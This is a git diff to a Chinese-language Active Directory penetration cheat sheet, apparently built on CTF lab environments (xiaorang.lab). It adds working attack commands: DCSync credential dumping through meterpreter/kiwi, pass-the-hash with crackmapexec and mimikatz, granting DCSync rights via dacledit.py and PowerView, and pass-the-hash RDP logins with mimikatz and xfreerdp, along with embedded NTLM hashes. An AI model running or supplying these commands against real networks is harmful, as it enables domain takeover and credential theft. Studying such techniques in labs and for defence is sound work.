@@ -133,14 +133,22 @@ DCSync攻击前提 一个用户想发起 DCSync 攻击，必须获得以下任�
 * Domain Admins组内的用户
 * Enterprise Admins组内的用户
 * 域控制器的计算机帐户
-* 即：默认情况下域管理员组具有该权限。
+* 即：默认情况下域管理员组具有该权限。所以在域渗透中拿到域管理员账号就可以变相拿到整个域的控制权限。
+
 ```sh
 meterpreter > load kiwi
 meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
 # 拿到hash后 通过哈希传递 拿到域控
 proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
-
 ```
+#### 添加 dsync权限, 见 春秋云境——Exchange 
+```
+方式一
+proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :0beff597ee3d7025627b2d9aa015bf4c -action write -rights DCSync -principal Zhangtong -target-dn 'DC=xiaorang,DC=lab' -dc-ip 172.22.3.2
+方式二
+powershell -command "cd C:/Users/benbi/Desktop/; Import-Module .\powerview.ps1; Add-DomainObjectAcl -TargetIdentity 'DC=xiaorang,DC=lab' -PrincipalIde Zhangtong -Rights DCSync -Verbose"
+```
+
 ### DC Takeover
 [Ichunqiu云境 —— Tsclient Writeup](https://mp.weixin.qq.com/s/1VDwjl_fhpZOKUy5-ZHCTQ)
 ### mimikatz PTH传递攻击
@@ -148,6 +156,16 @@ proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb4
 ```sh
 sekurlsa::pth /user:administrator /domain:g1ts /ntlm:ad5a870327c02f83cb947af6a94a4c23
 mimikatz.exe "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe"
+```
+
+### pth远程桌面登录
+```sh
+# mimikatz
+privilege::debug
+sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d "/run:mstsc.exe /restrictedadmin"
+# freerdp
+xfreerdp /u:administrator /p:test123! /v:192.168.62.136 /cert-ignore
+xfreerdp /u:administrator /pth:d25ecd13fddbb542d2e16da4f9e0333d /v:192.168.62.136 /cert-ignore
 ```
 
 ### 约束委派攻击
@@ -191,3 +209,4 @@ net use P: \\Name\zhq3211
 # Article
 
 [域内定位个人PC的三种方式](https://mp.weixin.qq.com/s/uXTo2AbmvMeNesR8rAjImw)
+[【内网域渗透系列教程】](https://www.bilibili.com/video/BV1xb4y1y7ju/)
